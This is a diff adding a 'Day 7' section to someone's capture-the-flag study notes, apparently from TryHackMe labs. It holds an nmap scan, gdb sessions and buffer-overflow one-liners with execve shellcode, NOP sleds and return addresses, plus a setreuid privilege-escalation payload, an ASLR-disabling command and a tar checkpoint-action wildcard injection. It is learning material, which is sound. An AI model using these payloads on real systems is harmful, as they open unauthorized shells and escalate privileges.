@@ -779,3 +779,104 @@ chmod +x shell.sh
 touch ./'--checkpoint-action=exec=sh shell.sh'
 touch ./'--checkpoint=1'
 ```
+
+### Day 7 - Leaving our comfort zone
+
+#### Brainstorm
+
+```
+nmap -sC -sV -T5 -Pn --min-rate 2500 target -oN nmap.log -v
+...
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|_  SYST: Windows_NT
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     Welcome to Brainstorm chat (beta)
+|     Please enter your username (max 20 characters): Write a message:
+...
+```
+
+#### Breathe and do bof1
+
+Hex code from room tasks to open up a basic shell (does not work here):
+```
+\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05
+```
+
+In general the approach is correct:
+```
+python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
+```
+
+Try & error (until 3am):
+```
+gdb --args ./buffer-overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+start
+set disassembly-flavor intel
+disas main
+disas copy_arg
+b *0x40054d
+c
+i r rip # 0x40054d 0x40054d <copy_arg+38>
+x/32wx $rdx
+p/x $rax # $1 = 0x7fffffffe380
+i f # ... rip at 0x7fffffffe418
+```
+
+##### Generate the payload with pwn and shellcraft
+
+The payload will conist of two parts:
+1. Set the uid to user2 (1002)
+2. Load a shell
+
+```
+from pwn import *
+context.clear(arch='amd64')
+asm(shellcraft.setreuid(1002))
+python3 -c 'print("1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05", end="")' | xxd -ps
+```
+
+This will give you the following output `31c3bf66c2bfc3aa036a715848c289c3be0f05` that you need to turn into `\x..` format. You can use Notepad++ for that e.g.
+
+Shell code will be: `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05`.
+
+##### local
+./buffer-overflow $(python -c 'print "\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xc0\xe4\xff\xff\xff\x7f"')
+
+##### THM server
+./buffer-overflow $(python -c 'print("\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xa8\xe7\xff\xff\xff\x7f")')
+
+./buffer-overflow $(python -c 'print("\x90" * 60 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" + "\x90" * 30 + "\xa8\xe7\xff\xff\xff\x7f")')
+
+#### CrackMe
+Source file: [crackme](https://myexperiments.io/exploit-basic-buffer-overflow.html)
+
+Shellcode from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-806.php)
+```
+\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
+```
+##### GDB solution
+```
+$(python -c 'print "\x90" * 68 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 41 + "\x80\xe0\xff\xff\xff\x7f"')
+```
+
+##### Outside GDB
+
+Temporarely disable ASLR ([source](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)):
+```
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+setarch `uname -m` -R /bin/bash
+```
+
+##### Error
+`/bin/dash: 0: Can't open`
+`����������������������������������`
+`���1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAA`
+
+Interesting additional resource [Slide 51](https://exploit.courses/files/bfh2017/day3/0x42_Exploit.pdf).
